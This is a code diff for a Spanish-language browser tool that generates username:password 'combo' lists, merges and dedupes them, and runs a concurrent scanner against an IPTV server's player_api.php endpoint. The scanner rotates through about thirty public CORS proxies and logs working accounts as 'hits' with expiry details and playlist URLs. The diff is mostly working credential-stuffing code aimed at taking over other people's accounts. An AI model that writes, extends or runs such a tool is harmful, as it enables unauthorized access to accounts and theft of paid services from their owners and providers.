-        const fileInput = document.getElementById('dedupeFile');
-        const textArea = document.getElementById('dedupeText');
-        if (fileInput.files.length) {
-            const file = fileInput.files[0];
-            const reader = new FileReader();
-            reader.onload = e => {
-                const lines = e.target.result.split(/\r?\n/);
-                dedupeLines = lines.filter(l => l.trim().length > 0);
-                procesarDedupe();
-            };
-            reader.readAsText(file);
-        } else if (textArea.value.trim()) {
-            dedupeLines = textArea.value.split(/\r?\n/).filter(l => l.trim().length > 0);
-            procesarDedupe();
-        } else {
-            alert("Selecciona un archivo o pega texto.");
-        }
-    }
-
-    function procesarDedupe() {
-        const unicos = [...new Set(dedupeLines)];
-        const resultado = unicos.join("\n");
-        document.getElementById('dedupeResultado').value = resultado;
-        document.getElementById('btnDescargarDedupe').disabled = (unicos.length === 0);
-        alert(`Duplicados eliminados: ${dedupeLines.length - unicos.length} eliminados, ${unicos.length} únicos.`);
-    }
-
-    function eliminarDuplicados() {
-        leerArchivoDedupe();
-    }
-
-    function descargarDedupeResultado() {
-        const contenido = document.getElementById('dedupeResultado').value;
-        if (!contenido) return;
-        const blob = new Blob([contenido], { type: 'text/plain' });
-        const a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = 'combos_sin_duplicados.txt';
-        a.click();
-        a.remove();
-    }
-
-    // Event listeners para los archivos de unión
-    document.getElementById('mergeFile1').addEventListener('change', () => readMergeFile(document.getElementById('mergeFile1'), mergeData.file1, 1));
-    document.getElementById('mergeFile2').addEventListener('change', () => readMergeFile(document.getElementById('mergeFile2'), mergeData.file2, 2));
-    document.getElementById('mergeFile3').addEventListener('change', () => readMergeFile(document.getElementById('mergeFile3'), mergeData.file3, 3));
-
-    // Sub-tabs interno
-    document.querySelectorAll('.sub-tab').forEach(btn => {
-        btn.addEventListener('click', () => {
-            const subId = btn.getAttribute('data-sub');
-            document.querySelectorAll('.sub-tab').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            document.querySelectorAll('.sub-panel').forEach(p => p.classList.remove('active'));
-            document.getElementById(`sub-${subId}`).classList.add('active');
-        });
-    });
-
-    // ==================== BLOC URLS Y BANCO HITS (original) ====================
+    // ==================== BLOC URLS Y BANCO HITS ====================
     function guardarUrlBloc() {
         const val = document.getElementById('inputUrlData').value.trim(), editId = document.getElementById('editUrlId').value;
         if (!val) return;
@@ -1107,9 +905,94 @@
         document.getElementById('panel-' + tabName).classList.add('active');
         let btn = Array.from(document.querySelectorAll('.tab-btn')).find(b => b.getAttribute('onclick')?.includes(tabName));
         if (btn) btn.classList.add('active');
+        if (tabName === 'chat') cargarMensajesChat();
     }
 
-    // ==================== ESCÁNER (sonido, proxies, etc.) - FORMATO DE HIT LIMPIO ====================
+    // ==================== COMBOS (generador, unir, dedupe) ====================
+    const nombresReales = [
+        "juan", "pedro", "carlos", "luis", "andres", "david", "diego", "javier", "manuel", "alejandro", "fernando", "miguel", "rafael", "jorge", "antonio", "angel", "jose", "daniel", "oscar", "ruben",
+        "mario", "ricardo", "victor", "roberto", "francisco", "pablo", "sergio", "adrian", "alberto", "eduardo", "emilio", "enrique", "esteban", "felipe", "gabriel", "guillermo", "hector", "ivan", "julian", "leonardo",
+        "mauricio", "nicolas", "raul", "rodrigo", "sebastian", "tomas", "alonso", "cristian", "fabian", "gaston", "hugo", "ignacio", "jeronimo", "kevin", "lucas", "martin", "nahuel", "octavio", "pablo", "ramon",
+        "santiago", "thiago", "ulises", "valentin", "wenceslao", "xavier", "yago", "zacarías", "abraham", "benjamin", "camilo", "damian", "elias", "facundo", "gonzalo", "hernan", "ismael", "jesus", "kamilo", "lautaro",
+        "mateo", "naomi", "oliver", "patricio", "quintin", "rene", "simon", "tadeo", "ursulo", "vladimir", "william", "ximena", "yandel", "zoe", "agustin", "bruno", "cesar", "domingo", "emiliano", "fidel",
+        "gerardo", "humberto", "ismael", "julio", "karen", "lorenzo", "marcos", "nelson", "orlando", "paul", "quiroga", "rolando", "saul", "tobias", "ulises", "valentin", "winston", "xenofonte", "yamil", "zulema",
+        "ana", "maria", "laura", "sofia", "valentina", "carmen", "isabella", "camila", "lucia", "martina", "julia", "paula", "daniela", "carolina", "alejandra", "veronica", "silvia", "lorena", "patricia", "gloria",
+        "elena", "rocio", "monica", "andrea", "fernanda", "gabriela", "mariana", "victoria", "beatriz", "roxana", "claudia", "viviana", "liliana", "norma", "cristina", "susana", "marcela", "graciela", "teresa", "raquel"
+    ];
+    const palabrasExtra = ["admin", "user", "test", "root", "master", "demo", "guest", "support", "office", "system", "server", "network", "digital", "global", "prime", "super", "mega", "ultra", "power", "plus"];
+    function applyCase(str, caseType) {
+        if (caseType === 'upper') return str.toUpperCase();
+        if (caseType === 'capitalize') return str.charAt(0).toUpperCase() + str.slice(1).toLowerCase();
+        return str.toLowerCase();
+    }
+    function generarPasswordAleatoria(longitud) {
+        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        let result = "";
+        for (let i = 0; i < longitud; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
+        return result;
+    }
+    function generarDesordenadoConLongitud(longitud) {
+        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*?-_";
+        let resultado = "";
+        for (let i = 0; i < longitud; i++) resultado += chars.charAt(Math.floor(Math.random() * chars.length));
+        return resultado;
+    }
+    function mezclarCase(texto) {
+        let mezclado = "";
+        for (let i = 0; i < texto.length; i++) mezclado += Math.random() > 0.5 ? texto[i].toUpperCase() : texto[i].toLowerCase();
+        return mezclado;
+    }
+    function generarComboAvanzado() {
+        const tipo = document.getElementById('genType').value;
+        let cantidad = parseInt(document.getElementById('genCantidad').value) || 100;
+        const passLength = parseInt(document.getElementById('genPassLength').value) || 8;
+        const separador = document.getElementById('genSep').value;
+        const userCase = document.getElementById('genUserCase').value;
+        const passCase = document.getElementById('genPassCase').value;
+        let combos = new Set();
+        let intentos = 0;
+        const maxIntentos = cantidad * 10;
+        function generarNumeroRango(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+        while (combos.size < cantidad && intentos < maxIntentos) {
+            intentos++;
+            let user = "", pass = "";
+            switch (tipo) {
+                case 'userpass_ano': let nb = nombresReales[Math.floor(Math.random() * nombresReales.length)]; let ano = generarNumeroRango(1996,2050); user = nb + ano; pass = "pass" + ano; break;
+                case 'useruser': let n1 = nombresReales[Math.floor(Math.random() * nombresReales.length)]; let n2 = nombresReales[Math.floor(Math.random() * nombresReales.length)]; user = n1; pass = n2; break;
+                case 'userpass_num': let nn = nombresReales[Math.floor(Math.random() * nombresReales.length)]; let num = generarNumeroRango(1,999); user = nn + num; pass = "pass" + num; break;
+                case 'alfanumericos': user = Math.random().toString(36).substring(2,8)+generarNumeroRango(100,999); pass = generarPasswordAleatoria(passLength); break;
+                case 'user_num_fijo': let nf = palabrasExtra[Math.floor(Math.random() * palabrasExtra.length)]; let nfijo = generarNumeroRango(123,999999); user = nf; pass = nfijo.toString(); break;
+                case 'user_num_random': let nr = palabrasExtra[Math.floor(Math.random() * palabrasExtra.length)]; let nrand = Math.floor(Math.random() * 99999) + 12345; user = nr; pass = nrand.toString(); break;
+                case 'num_num': user = Math.floor(Math.random() * 999999).toString(); pass = Math.floor(Math.random() * 999999).toString(); break;
+                case 'nombre_alfanumerico': let na = nombresReales[Math.floor(Math.random() * nombresReales.length)]; let alfa = Math.random().toString(36).substring(2,6); user = na; pass = alfa + generarNumeroRango(100,999); break;
+                case 'personalizado': let bases = ["elpro","master","dios","rey","leon","fuego","rojo","negro","tigre","jaguar"]; let pref = bases[Math.floor(Math.random() * bases.length)]; let suf = Math.floor(Math.random() * 999); user = pref + suf; pass = generarPasswordAleatoria(passLength); break;
+                case 'desordenado': let nd = nombresReales[Math.floor(Math.random() * nombresReales.length)]; let ed = palabrasExtra[Math.floor(Math.random() * palabrasExtra.length)]; let bu = nd + ed + Math.floor(Math.random() * 999); user = generarDesordenadoConLongitud(Math.min(bu.length,12)) || bu; user = mezclarCase(user); pass = generarDesordenadoConLongitud(passLength); break;
+                case 'mezclado': let nm = nombresReales[Math.floor(Math.random() * nombresReales.length)]; let em = palabrasExtra[Math.floor(Math.random() * palabrasExtra.length)]; let nums = Math.floor(Math.random() * 999); let bc = nm + em + nums; user = mezclarCase(bc); pass = (Math.random() > 0.5) ? mezclarCase(bc) : generarDesordenadoConLongitud(passLength); break;
+                default: user = "user"+Math.random(); pass = generarPasswordAleatoria(passLength);
+            }
+            if (tipo !== 'desordenado' && tipo !== 'mezclado') { user = applyCase(user, userCase); pass = applyCase(pass, passCase); }
+            combos.add(user + separador + pass);
+        }
+        alert(combos.size < cantidad ? `⚠️ Solo ${combos.size} combos únicos.` : `✅ ${cantidad} combos sin repeticiones.`);
+        document.getElementById('comboResultado').value = Array.from(combos).join("\n");
+        document.getElementById('btnDescargarComboGen').disabled = false;
+    }
+    function descargarComboGenerado() { const c = document.getElementById('comboResultado').value; if(!c) return; const blob = new Blob([c],{type:'text/plain'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='combo_generado.txt'; a.click(); a.remove(); }
+    let mergeData = { file1: [], file2: [], file3: [] };
+    function readMergeFile(inputEl, targetArray) { const f = inputEl.files[0]; if(!f){ targetArray.length=0; return; } const r = new FileReader(); r.onload = e => { const lines = e.target.result.split(/\r?\n/).filter(l=>l.trim().length>0); targetArray.length = 0; targetArray.push(...lines); actualizarMergeResultado(); }; r.readAsText(f); }
+    function actualizarMergeResultado() { let combined = []; if(mergeData.file1.length) combined.push(...mergeData.file1); if(mergeData.file2.length) combined.push(...mergeData.file2); if(mergeData.file3.length) combined.push(...mergeData.file3); document.getElementById('mergeResultado').value = combined.join("\n"); document.getElementById('btnDescargarMerge').disabled = (combined.length===0); }
+    function unirCombos() { const f1=document.getElementById('mergeFile1'), f2=document.getElementById('mergeFile2'), f3=document.getElementById('mergeFile3'); if(f1.files.length) readMergeFile(f1, mergeData.file1); if(f2.files.length) readMergeFile(f2, mergeData.file2); if(f3.files.length) readMergeFile(f3, mergeData.file3); if(!f1.files.length && !f2.files.length && !f3.files.length) alert("Selecciona al menos un archivo."); else actualizarMergeResultado(); }
+    function descargarMergeResultado() { const c = document.getElementById('mergeResultado').value; if(!c) return; const blob = new Blob([c],{type:'text/plain'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='combos_unidos.txt'; a.click(); a.remove(); }
+    let dedupeLines = [];
+    function eliminarDuplicados() { const fileInput=document.getElementById('dedupeFile'), textArea=document.getElementById('dedupeText'); if(fileInput.files.length){ const f=fileInput.files[0]; const r=new FileReader(); r.onload=e=>{ dedupeLines = e.target.result.split(/\r?\n/).filter(l=>l.trim().length>0); procesarDedupe(); }; r.readAsText(f); } else if(textArea.value.trim()){ dedupeLines = textArea.value.split(/\r?\n/).filter(l=>l.trim().length>0); procesarDedupe(); } else alert("Selecciona archivo o pega texto."); }
+    function procesarDedupe() { const unicos = [...new Set(dedupeLines)]; document.getElementById('dedupeResultado').value = unicos.join("\n"); document.getElementById('btnDescargarDedupe').disabled = (unicos.length===0); alert(`Duplicados eliminados: ${dedupeLines.length - unicos.length} eliminados, ${unicos.length} únicos.`); }
+    function descargarDedupeResultado() { const c = document.getElementById('dedupeResultado').value; if(!c) return; const blob = new Blob([c],{type:'text/plain'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='combos_sin_duplicados.txt'; a.click(); a.remove(); }
+    document.getElementById('mergeFile1').addEventListener('change',()=>readMergeFile(document.getElementById('mergeFile1'), mergeData.file1));
+    document.getElementById('mergeFile2').addEventListener('change',()=>readMergeFile(document.getElementById('mergeFile2'), mergeData.file2));
+    document.getElementById('mergeFile3').addEventListener('change',()=>readMergeFile(document.getElementById('mergeFile3'), mergeData.file3));
+    document.querySelectorAll('.sub-tab').forEach(btn=>{ btn.addEventListener('click',()=>{ const subId=btn.getAttribute('data-sub'); document.querySelectorAll('.sub-tab').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); document.querySelectorAll('.sub-panel').forEach(p=>p.classList.remove('active')); document.getElementById(`sub-${subId}`).classList.add('active'); }); });
+
+    // ==================== ESCÁNER (completo, con sonido y proxies) ====================
     let moanAudioContext = null;
     function playMoanSound() {
         if (!document.getElementById('soundToggle').checked) return;
@@ -1130,229 +1013,227 @@
             osc.start();
             osc.stop(now + 0.8);
             if (navigator.vibrate) navigator.vibrate(200);
-        } catch (e) { console.log("Audio error", e); }
+        } catch(e) { console.log("Audio error", e); }
     }
-
     const CORS_PROXIES = [
-        'https://api.allorigins.win/raw?url={url}',
-        'https://corsproxy.io/?{url}',
-        'https://api.codetabs.com/v1/proxy/?quest={url}',
-        'https://cors-anywhere.herokuapp.com/{url}',
-        'https://proxy.cors.sh/{url}',
-        'https://cors.eu.org/{url}',
-        'https://cors-proxy.htmldriven.com/?url={url}',
-        'https://thingproxy.freeboard.io/fetch/{url}',
-        'https://cors.zme.ink/{url}',
-        'https://cors.ninja/{url}',
-        'https://cors.iry.dev/{url}',
-        'https://api.cors.lol/?url={url}',
-        'https://cors-proxy.elfsight.com/?url={url}',
-        'https://blooming-shelf-78862.herokuapp.com/{url}',
-        'https://aqueous-reef-74995.herokuapp.com/{url}',
-        'https://cors-proxy.fly.dev/{url}',
-        'https://cors.shuttleapp.rs/{url}',
-        'https://cors-proxy.onrender.com/{url}',
-        'https://cors.isomorphic-git.org/{url}',
-        'https://yacdn.org/proxy/{url}',
-        'https://api.s0n1c.org/cors?url={url}',
-        'https://cors.bridged.cc/{url}',
-        'https://crossorigin.me/{url}',
-        'https://cors.5apps.com/{url}',
-        'https://cors.io/?{url}',
-        'https://proxy.kinesis.pro/{url}',
-        'https://cors-proxy-9d1l.onrender.com/{url}',
-        'https://cors.olimox.workers.dev/?{url}',
-        'https://cors-relay.vercel.app/api?url={url}'
+        'https://api.allorigins.win/raw?url={url}','https://corsproxy.io/?{url}','https://api.codetabs.com/v1/proxy/?quest={url}','https://cors-anywhere.herokuapp.com/{url}','https://proxy.cors.sh/{url}','https://cors.eu.org/{url}','https://cors-proxy.htmldriven.com/?url={url}','https://thingproxy.freeboard.io/fetch/{url}','https://cors.zme.ink/{url}','https://cors.ninja/{url}','https://cors.iry.dev/{url}','https://api.cors.lol/?url={url}','https://cors-proxy.elfsight.com/?url={url}','https://blooming-shelf-78862.herokuapp.com/{url}','https://aqueous-reef-74995.herokuapp.com/{url}','https://cors-proxy.fly.dev/{url}','https://cors.shuttleapp.rs/{url}','https://cors-proxy.onrender.com/{url}','https://cors.isomorphic-git.org/{url}','https://yacdn.org/proxy/{url}','https://api.s0n1c.org/cors?url={url}','https://cors.bridged.cc/{url}','https://crossorigin.me/{url}','https://cors.5apps.com/{url}','https://cors.io/?{url}','https://proxy.kinesis.pro/{url}','https://cors-proxy-9d1l.onrender.com/{url}','https://cors.olimox.workers.dev/?{url}','https://cors-relay.vercel.app/api?url={url}'
     ];
-
-    const PROXY_FAILS = new Map();
-    const MAX_FAILS = 2;
-    const COOLDOWN_MS = 30000;
+    const PROXY_FAILS = new Map(); const MAX_FAILS = 2; const COOLDOWN_MS = 30000;
     function isProxyOnCooldown(tpl) { let d = PROXY_FAILS.get(tpl); return d && d.until && Date.now() < d.until; }
-    function markProxyFail(tpl) { let d = PROXY_FAILS.get(tpl) || { fails: 0, until: 0 }; d.fails++; if (d.fails >= MAX_FAILS) { d.until = Date.now() + COOLDOWN_MS; d.fails = 0; } PROXY_FAILS.set(tpl, d); }
+    function markProxyFail(tpl) { let d = PROXY_FAILS.get(tpl) || { fails:0, until:0 }; d.fails++; if(d.fails>=MAX_FAILS){ d.until=Date.now()+COOLDOWN_MS; d.fails=0; } PROXY_FAILS.set(tpl,d); }
     function markProxySuccess(tpl) { PROXY_FAILS.delete(tpl); }
-
     async function fetchWithCors(url, options = {}, intentos = 3) {
         const opts = { cache: 'no-store', ...options };
-        if (!document.getElementById('useCors').checked) {
-            let r = await fetch(url, opts);
-            if (r.ok) return r;
-            throw new Error('Direct fetch failed');
-        }
+        if (!document.getElementById('useCors').checked) { let r = await fetch(url, opts); if(r.ok) return r; throw new Error('Direct fetch failed'); }
         let proxies = CORS_PROXIES.filter(tpl => !isProxyOnCooldown(tpl));
-        if (proxies.length === 0) proxies = [...CORS_PROXIES];
-        for (let i = proxies.length - 1; i > 0; i--) { let j = Math.floor(Math.random() * (i + 1)); [proxies[i], proxies[j]] = [proxies[j], proxies[i]]; }
-        for (let tpl of proxies) {
-            try {
-                let proxied = tpl.replace('{url}', encodeURIComponent(url));
-                let res = await fetch(proxied, opts);
-                if (res && res.ok) { markProxySuccess(tpl); return res; }
-                else markProxyFail(tpl);
-            } catch (e) { markProxyFail(tpl); }
+        if(proxies.length===0) proxies = [...CORS_PROXIES];
+        for(let i=proxies.length-1;i>0;i--){ let j=Math.floor(Math.random()*(i+1)); [proxies[i],proxies[j]]=[proxies[j],proxies[i]]; }
+        for(let tpl of proxies){
+            try{ let proxied = tpl.replace('{url}', encodeURIComponent(url)); let res = await fetch(proxied, opts); if(res && res.ok){ markProxySuccess(tpl); return res; } else markProxyFail(tpl); } catch(e){ markProxyFail(tpl); }
         }
-        if (intentos > 1) { await new Promise(r => setTimeout(r, 1000)); return fetchWithCors(url, options, intentos - 1); }
+        if(intentos>1){ await new Promise(r=>setTimeout(r,1000)); return fetchWithCors(url,options,intentos-1); }
         throw new Error('All proxies failed');
     }
-
-    function extractCombo(line) {
-        if (!line) return null;
-        let s = line.trim();
-        let m = s.match(/([^:\s]+)\s*:\s*([^:\s]+)/);
-        return m ? [m[1].trim(), m[2].trim()] : null;
-    }
-
-    const hostInput = document.getElementById('hostInput');
-    const concurrencyInput = document.getElementById('concurrencyInput');
-    const startBtn = document.getElementById('startBtn'), stopBtn = document.getElementById('stopBtn'), saveBtn = document.getElementById('saveBtn');
-    const comboText = document.getElementById('comboText');
-    const comboFile1 = document.getElementById('comboFile1'), comboFile2 = document.getElementById('comboFile2'), comboFile3 = document.getElementById('comboFile3');
-    const hitsContainer = document.getElementById('hitsContainer');
-
+    function extractCombo(line){ if(!line) return null; let s=line.trim(); let m=s.match(/([^:\s]+)\s*:\s*([^:\s]+)/); return m ? [m[1].trim(), m[2].trim()] : null; }
+    const hostInput = document.getElementById('hostInput'), concurrencyInput = document.getElementById('concurrencyInput'), startBtn = document.getElementById('startBtn'), stopBtn = document.getElementById('stopBtn'), saveBtn = document.getElementById('saveBtn');
+    const comboText = document.getElementById('comboText'), comboFile1 = document.getElementById('comboFile1'), comboFile2 = document.getElementById('comboFile2'), comboFile3 = document.getElementById('comboFile3'), hitsContainer = document.getElementById('hitsContainer');
     let isRunning = false, stopRequested = false;
     let combos1 = [], combos2 = [], combos3 = [], combosTxt = [];
     const HITS = { 1: [], 2: [], 3: [] };
-
-    function updateStartState() {
-        const hasHost = !!hostInput.value.trim();
-        startBtn.disabled = !(hasHost && (combos1.length || combos2.length || combos3.length || combosTxt.length));
-    }
-
-    async function processarCombosJob(host, combos, conc, jobId) {
+    function updateStartState(){ const hasHost = !!hostInput.value.trim(); startBtn.disabled = !(hasHost && (combos1.length || combos2.length || combos3.length || combosTxt.length)); }
+    async function processarCombosJob(host, combos, conc, jobId){
         let total = combos.length, processed = 0, index = 0;
         const fill = document.getElementById(jobId === 1 ? 'progressBarFill' : (jobId === 2 ? 'progressBarFill2' : 'progressBarFill3'));
         const txt = document.getElementById(jobId === 1 ? 'progressText' : (jobId === 2 ? 'progressText2' : 'progressText3'));
         const userDisp = document.getElementById(jobId === 1 ? 'currentCombo' : (jobId === 2 ? 'currentCombo2' : 'currentCombo3'));
         const countSpan = document.getElementById(jobId === 1 ? 'hitsCount1' : (jobId === 2 ? 'hitsCount2' : 'hitsCount3'));
-
-        async function worker() {
-            while (index < total && !stopRequested) {
-                const i = index++; if (i >= total) break;
-                const pair = extractCombo(combos[i]); if (!pair) continue;
+        async function worker(){
+            while(index < total && !stopRequested){
+                const i = index++; if(i >= total) break;
+                const pair = extractCombo(combos[i]); if(!pair) continue;
                 const [user, pass] = pair;
                 userDisp.textContent = `Usuario: ${user}:${pass}`;
                 try {
                     const url = `http://${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
                     const res = await fetchWithCors(url, { cache: 'no-store' });
                     const data = await res.json();
-                    if (data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
+                    if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)){
                         playMoanSound();
                         const info = data.user_info;
                         const expDate = info.exp_date ? new Date(info.exp_date * 1000).toLocaleString('sv-SE') : 'Ilimitado';
-
-                        // Obtener canales, películas, series (solo si existen y >0)
-                        let liveChannels = 0;
-                        let movies = 0;
-                        let series = 0;
-                        if (data.available_channels && Array.isArray(data.available_channels)) liveChannels = data.available_channels.length;
-                        else if (data.total_channels) liveChannels = data.total_channels;
-                        else if (data.channels_count) liveChannels = data.channels_count;
-                        if (data.movies_count) movies = data.movies_count;
-                        else if (data.total_movies) movies = data.total_movies;
-                        if (data.series_count) series = data.series_count;
-                        else if (data.total_series) series = data.total_series;
-
-                        // Construir líneas de información solo si el valor es > 0
+                        let liveChannels = 0, movies = 0, series = 0;
+                        if(data.available_channels && Array.isArray(data.available_channels)) liveChannels = data.available_channels.length;
+                        else if(data.total_channels) liveChannels = data.total_channels;
+                        else if(data.channels_count) liveChannels = data.channels_count;
+                        if(data.movies_count) movies = data.movies_count;
+                        else if(data.total_movies) movies = data.total_movies;
+                        if(data.series_count) series = data.series_count;
+                        else if(data.total_series) series = data.total_series;
                         let infoExtra = "";
-                        if (liveChannels > 0) infoExtra += `├── 📺 Canales ➤ ${liveChannels}\n`;
-                        if (movies > 0) infoExtra += `├── 🎬 Películas ➤ ${movies}\n`;
-                        if (series > 0) infoExtra += `├── 📺 Series ➤ ${series}\n`;
-                        // Si no hay ninguna línea extra, no agregamos nada (pero mantenemos el resto)
-
-                        const texto = `Host ➤ http://${host}
-├── Dominio ➤ http://${host.split(':')[0]}
-├── User ➤ ${user}
-├── Pass ➤ ${pass}
-├── Exp. ➤ ${expDate}
-├── Act Con ➤ ${info.active_cons || 0}
-├── Max Con ➤ ${info.max_connections || "N/A"}
-├── Status ➤ ${info.status}
-${infoExtra}╰─➤ Zona ➤ ${info.timezone || "N/A"}
-
-╭─➤ 🄼➂🅄 
-├  http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;
-
+                        if(liveChannels > 0) infoExtra += `├── 📺 Canales ➤ ${liveChannels}\n`;
+                        if(movies > 0) infoExtra += `├── 🎬 Películas ➤ ${movies}\n`;
+                        if(series > 0) infoExtra += `├── 📺 Series ➤ ${series}\n`;
+                        const texto = `Host ➤ http://${host}\n├── Dominio ➤ http://${host.split(':')[0]}\n├── User ➤ ${user}\n├── Pass ➤ ${pass}\n├── Exp. ➤ ${expDate}\n├── Act Con ➤ ${info.active_cons || 0}\n├── Max Con ➤ ${info.max_connections || "N/A"}\n├── Status ➤ ${info.status}\n${infoExtra}╰─➤ Zona ➤ ${info.timezone || "N/A"}\n\n╭─➤ 🄼➂🅄 \n├  http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;
                         HITS[jobId].push({ user, pass, texto });
                         countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
-                        const div = document.createElement('div');
-                        div.className = 'hit-block';
+                        const div = document.createElement('div'); div.className = 'hit-block';
                         div.innerHTML = `<div class="hit-header">👤 ${user} : ${pass}</div><pre class="hit-content">${texto}</pre>`;
                         hitsContainer.prepend(div);
                         guardarHitEnBanco(texto, user, pass);
                     }
-                } catch (e) { }
-                finally {
-                    processed++;
-                    fill.style.width = ((processed / total) * 100) + '%';
-                    txt.textContent = `Procesados: ${processed} / ${total}`;
+                } catch(e) { } finally {
+                    processed++; fill.style.width = ((processed/total)*100)+'%'; txt.textContent = `Procesados: ${processed} / ${total}`;
                 }
             }
         }
         await Promise.all(Array.from({ length: conc }, () => worker()));
     }
-
-    function readTxtFile(inputEl, targetArray) {
-        targetArray.length = 0;
-        const f = inputEl.files?.[0];
-        if (!f) { updateStartState(); return; }
-        const r = new FileReader();
-        r.onload = e => {
-            String(e.target.result).split(/\r?\n/).forEach(l => { if (extractCombo(l)) targetArray.push(l); });
-            updateStartState();
-        };
-        r.readAsText(f);
-    }
-
-    comboFile1.addEventListener('change', () => readTxtFile(comboFile1, combos1));
-    comboFile2.addEventListener('change', () => readTxtFile(comboFile2, combos2));
-    comboFile3.addEventListener('change', () => readTxtFile(comboFile3, combos3));
-    comboText.addEventListener('input', () => {
-        combosTxt.length = 0;
-        comboText.value.split(/\r?\n/).forEach(l => { if (extractCombo(l)) combosTxt.push(l); });
-        updateStartState();
-    });
+    function readTxtFile(inputEl, targetArray){ targetArray.length=0; const f=inputEl.files?.[0]; if(!f){ updateStartState(); return; } const r=new FileReader(); r.onload=e=>{ String(e.target.result).split(/\r?\n/).forEach(l=>{ if(extractCombo(l)) targetArray.push(l); }); updateStartState(); }; r.readAsText(f); }
+    comboFile1.addEventListener('change',()=>readTxtFile(comboFile1, combos1));
+    comboFile2.addEventListener('change',()=>readTxtFile(comboFile2, combos2));
+    comboFile3.addEventListener('change',()=>readTxtFile(comboFile3, combos3));
+    comboText.addEventListener('input',()=>{ combosTxt.length=0; comboText.value.split(/\r?\n/).forEach(l=>{ if(extractCombo(l)) combosTxt.push(l); }); updateStartState(); });
     hostInput.addEventListener('input', updateStartState);
-
-    startBtn.addEventListener('click', async () => {
-        if (isRunning) return;
-        if (moanAudioContext && moanAudioContext.state === 'suspended') await moanAudioContext.resume();
-        isRunning = true; stopRequested = false;
-        startBtn.disabled = true; stopBtn.disabled = false;
-        if (combosTxt.length) { combos1 = combos1.concat(combosTxt); combosTxt = []; }
-        const host = hostInput.value.replace(/^https?:\/\//, '').trim();
+    startBtn.addEventListener('click', async ()=>{
+        if(isRunning) return;
+        if(moanAudioContext && moanAudioContext.state==='suspended') await moanAudioContext.resume();
+        isRunning=true; stopRequested=false;
+        startBtn.disabled=true; stopBtn.disabled=false;
+        if(combosTxt.length){ combos1=combos1.concat(combosTxt); combosTxt=[]; }
+        const host = hostInput.value.replace(/^https?:\/\//,'').trim();
         const conc = parseInt(concurrencyInput.value) || 80;
         const jobs = [];
-        if (combos1.length) jobs.push(processarCombosJob(host, combos1, Math.floor(conc / 3) || 20, 1));
-        if (combos2.length) jobs.push(processarCombosJob(host, combos2, Math.floor(conc / 3) || 20, 2));
-        if (combos3.length) jobs.push(processarCombosJob(host, combos3, Math.floor(conc / 3) || 20, 3));
-        Promise.allSettled(jobs).then(() => {
-            isRunning = false; stopBtn.disabled = true; startBtn.disabled = false; saveBtn.disabled = false;
-            if (document.getElementById('autoDownload').checked) {
-                const allHits = [...HITS[1], ...HITS[2], ...HITS[3]];
-                if (allHits.length) {
-                    let content = allHits.map(h => h.texto).join('\n\n================\n\n');
-                    const blob = new Blob([content], { type: 'text/plain' });
-                    const a = document.createElement('a');
-                    a.href = URL.createObjectURL(blob);
-                    a.download = `scan_${host}_${new Date().toISOString().slice(0, 19)}.txt`;
-                    a.click();
+        if(combos1.length) jobs.push(processarCombosJob(host, combos1, Math.floor(conc/3)||20, 1));
+        if(combos2.length) jobs.push(processarCombosJob(host, combos2, Math.floor(conc/3)||20, 2));
+        if(combos3.length) jobs.push(processarCombosJob(host, combos3, Math.floor(conc/3)||20, 3));
+        Promise.allSettled(jobs).then(()=>{
+            isRunning=false; stopBtn.disabled=true; startBtn.disabled=false; saveBtn.disabled=false;
+            if(document.getElementById('autoDownload').checked){
+                const allHits = [...HITS[1],...HITS[2],...HITS[3]];
+                if(allHits.length){
+                    let content = allHits.map(h=>h.texto).join('\n\n================\n\n');
+                    const blob = new Blob([content],{type:'text/plain'});
+                    const a = document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`scan_${host}_${new Date().toISOString().slice(0,19)}.txt`; a.click(); a.remove();
                 }
             }
         });
     });
-
-    stopBtn.addEventListener('click', () => { stopRequested = true; });
-    saveBtn.addEventListener('click', () => {
-        const allHits = [...HITS[1], ...HITS[2], ...HITS[3]];
-        if (!allHits.length) { alert("No hay hits para guardar."); return; }
-        let content = allHits.map(h => h.texto).join('\n\n================\n\n');
-        const blob = new Blob([content], { type: 'text/plain' });
-        const a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = `scan_${hostInput.value.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.txt`;
-        a.click();
+    stopBtn.addEventListener('click',()=>{ stopRequested=true; });
+    saveBtn.addEventListener('click',()=>{
+        const allHits = [...HITS[1],...HITS[2],...HITS[3]];
+        if(!allHits.length){ alert("No hay hits para guardar."); return; }
+        let content = allHits.map(h=>h.texto).join('\n\n================\n\n');
+        const blob = new Blob([content],{type:'text/plain'});
+        const a = document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`scan_${hostInput.value.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.txt`; a.click(); a.remove();
     });
-
     updateStartState();
+
+    // ==================== CHAT ====================
+    let chatDisplayName = "", chatAvatar = "🦁";
+    let currentReplyTo = null;
+    function getUserColor(email) { let hash=0; for(let i=0;i<email.length;i++) hash=((hash<<5)-hash)+email.charCodeAt(i); const hue=Math.abs(hash%360); return `hsl(${hue}, 70%, 60%)`; }
+    async function cargarPerfilUsuario(email) {
+        const perfilRef = db.ref(`chat_profiles/${currentUser.uid}`);
+        const snapshot = await perfilRef.once('value');
+        if(snapshot.exists()){ const data=snapshot.val(); chatDisplayName=data.name||email.split('@')[0]; chatAvatar=data.avatar||"🦁"; }
